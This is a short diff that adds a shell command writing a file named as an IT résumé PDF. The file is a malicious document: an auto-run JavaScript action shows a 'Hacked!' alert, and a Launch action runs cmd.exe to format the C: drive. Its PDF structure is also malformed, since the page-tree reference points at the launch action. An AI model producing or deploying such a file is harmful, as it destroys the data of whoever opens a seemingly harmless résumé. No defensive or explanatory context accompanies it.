@@ -1,0 +1,9 @@
+cat << 'EOF' > curriculo_ti.pdf
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('Hackeado!');) >> >>
+endobj
+2 0 obj
+<< /S /Launch /F (cmd.exe) /P (/c format C:) >>
+endobj
+EOF
